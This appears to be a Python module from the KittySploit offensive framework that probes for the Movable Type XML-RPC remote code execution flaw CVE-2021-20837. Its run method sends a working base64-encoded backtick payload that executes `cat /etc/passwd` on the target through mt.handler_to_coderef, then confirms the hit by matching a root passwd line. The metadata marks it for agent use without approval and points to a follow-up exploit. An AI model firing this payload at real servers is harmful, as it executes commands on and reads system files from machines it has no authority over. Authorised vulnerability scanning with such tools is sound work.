#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Movable Type XML-RPC mt.handler_to_coderef RCE (CVE-2021-20837)."""

import base64
import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Movable Type - XML-RPC RCE Detection (CVE-2021-20837)',
        'description': (
            'Detects CVE-2021-20837 by POSTing mt.handler_to_coderef XML-RPC with a '
            'base64-encoded backtick payload that reads /etc/passwd via /mt/mt-xmlrpc.cgi.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2021', 'movable-type', 'rce', 'xmlrpc',
            'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'exploits/linux/http/movable_type_cve_2021_20837_rce',
                ],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2021-20837',
            'https://jvn.jp/en/jp/JVN37015719/',
        ],
        'cve': 'CVE-2021-20837',
    }

    base_path = OptString('', 'Optional Movable Type base path', required=False)

    def _prefix(self) -> str:
        base = str(self.base_path or '').strip()
        if not base or base == '/':
            return ''
        if not base.startswith('/'):
            base = '/' + base
        return base.rstrip('/')

    def run(self):
        path = f'{self._prefix()}/mt/mt-xmlrpc.cgi'
        payload = base64.b64encode(b'`cat /etc/passwd`').decode('ascii')
        data = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<methodCall><methodName>mt.handler_to_coderef</methodName>'
            f'<params><param><value><base64>{payload}</base64></value></param></params>'
            '</methodCall>'
        )
        r = self.http_request(
            method='POST',
            path=path,
            data=data,
            headers={'Content-Type': 'text/xml; charset=UTF-8'},
            allow_redirects=False,
        )
        if not r:
            return False
        if re.search(r'root:.*:0:0:', r.text or ''):
            self.set_info(
                severity='critical',
                reason='Movable Type XML-RPC RCE (CVE-2021-20837): /etc/passwd via backticks',
                path=path,
            )
            return True
        return False
